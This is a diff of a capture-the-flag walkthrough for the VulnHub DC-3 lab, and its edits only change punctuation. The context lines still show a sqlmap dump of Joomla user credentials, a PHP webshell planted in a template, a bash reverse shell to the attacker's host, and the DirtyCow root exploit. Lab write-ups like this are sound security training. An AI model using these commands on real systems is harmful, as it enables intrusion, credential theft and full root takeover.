@@ -1,4 +1,4 @@
-# DC-3 (VulnHub) — My Walkthrough
+# DC-3 (VulnHub): My Walkthrough
 
 **Target:** 10.0.2.12 | **Attacker:** Kali, 10.0.2.6 | **Result:** Root, flag captured
 
@@ -13,7 +13,7 @@ sudo nmap -sn 10.0.2.0/24
 nmap -sV 10.0.2.12
 ```
 
-Only port 80 open, Apache 2.4.18 on Ubuntu. Given it's the only service, I figured there was a CMS behind it — Joomla turned out to be right.
+Only port 80 open, Apache 2.4.18 on Ubuntu. Given it's the only service, I figured there was a CMS behind it, Joomla turned out to be right.
 
 ## 2. Confirming Joomla and its version
 
@@ -31,7 +31,7 @@ searchsploit joomla 3.7
 searchsploit -x php/webapps/42033.txt
 ```
 
-Joomla 3.7.0 immediately pointed me at the 'com_fields' SQL Injection (CVE-2017-8917) — a well-known one for this version. Read through the full write-up with `-x` to get the exact vulnerable parameter (`list[fullordering]`) and the sqlmap syntax I'd need.
+Joomla 3.7.0 immediately pointed me at the 'com_fields' SQL Injection (CVE-2017-8917), a well-known one for this version. Read through the full write-up with `-x` to get the exact vulnerable parameter (`list[fullordering]`) and the sqlmap syntax I'd need.
 
 ## 4. Exploiting the SQLi with sqlmap
 
@@ -49,7 +49,7 @@ This confirmed the injection (both error-based and time-based blind worked) and 
 sqlmap -u "http://10.0.2.12/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C id,name,username,email,password --dump
 ```
 
-Targeted the `#__users` table specifically (Joomla prefixes its tables with `#__`). Column auto-discovery didn't work for me, so I had to manually specify the columns I wanted — sqlmap's common-columns brute-force check helped me figure out what they were called.
+Targeted the `#__users` table specifically (Joomla prefixes its tables with `#__`). Column auto-discovery didn't work for me, so I had to manually specify the columns I wanted, sqlmap's common-columns brute-force check helped me figure out what they were called.
 
 Got back the admin account: username `admin`, email `freddy@norealaddress.net`, and a bcrypt hash.
 
@@ -61,7 +61,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt joomla_hash.txt
 john --show --format=bcrypt joomla_hash.txt
 ```
 
-The `$2y$` prefix told me it was bcrypt, so I had to explicitly tell John that format rather than let it guess. Cracked pretty fast against rockyou — password turned out to be `snoopy`.
+The `$2y$` prefix told me it was bcrypt, so I had to explicitly tell John that format rather than let it guess. Cracked pretty fast against rockyou, password turned out to be `snoopy`.
 
 ## 7. Logging in and getting code execution
 
@@ -77,7 +77,7 @@ system($_GET['cmd']);
 ...
 ```
 
-The placement matters — that guard line kills execution instantly if the file's accessed directly instead of through Joomla's front controller, so my payload needed to run before that check happened.
+The placement matters, that guard line kills execution instantly if the file's accessed directly instead of through Joomla's front controller, so my payload needed to run before that check happened.
 
 Triggered it with `http://10.0.2.12/templates/beez3/index.php?cmd=id` and got back `www-data`.
 
@@ -95,7 +95,7 @@ Then triggered a URL-encoded bash reverse shell through the webshell:
 http://10.0.2.12/templates/beez3/index.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.0.2.6/4444+0%3E%261%22
 ```
 
-That decodes to `bash -c "bash -i >& /dev/tcp/10.0.2.6/4444 0>&1"` — a pretty standard bash-native reverse shell one-liner. Stabilized it the usual way:
+That decodes to `bash -c "bash -i >& /dev/tcp/10.0.2.6/4444 0>&1"`, a pretty standard bash-native reverse shell one-liner. Stabilized it the usual way:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -110,7 +110,7 @@ uname -a
 cat /etc/os-release
 ```
 
-No unusual SUID binaries, no sudo rights for www-data — so the usual quick wins were off the table. But `uname -a` told me the kernel was 4.4.0-21 on Ubuntu 16.04, which immediately made me think of DirtyCow.
+No unusual SUID binaries, no sudo rights for www-data, so the usual quick wins were off the table. But `uname -a` told me the kernel was 4.4.0-21 on Ubuntu 16.04, which immediately made me think of DirtyCow.
 
 ## 10. Grabbing the DirtyCow exploit
 
@@ -135,7 +135,7 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow dirtycow.cpp -lutil
 ./dirtycow
 ```
 
-DirtyCow (CVE-2016-5195) is a race condition in how the kernel handles copy-on-write memory — this particular exploit variant abuses it to overwrite `/etc/passwd` and add a new root-equivalent user with a password of my choosing, so I didn't need any further exploitation after this point.
+DirtyCow (CVE-2016-5195) is a race condition in how the kernel handles copy-on-write memory, this particular exploit variant abuses it to overwrite `/etc/passwd` and add a new root-equivalent user with a password of my choosing, so I didn't need any further exploitation after this point.
 
 It ran successfully and set my new root password to `dirtyCowFun`.
 
@@ -154,7 +154,7 @@ ls -la /root/
 cat /root/the-flag.txt
 ```
 
-Confirmed `uid=0(root)`. Flag was named `the-flag.txt`, not the `flag.txt` I was half-expecting — worth double-checking naming conventions rather than assuming. DC-3 fully rooted.
+Confirmed `uid=0(root)`. Flag was named `the-flag.txt`, not the `flag.txt` I was half-expecting, worth double-checking naming conventions rather than assuming. DC-3 fully rooted.
 
 ---
 
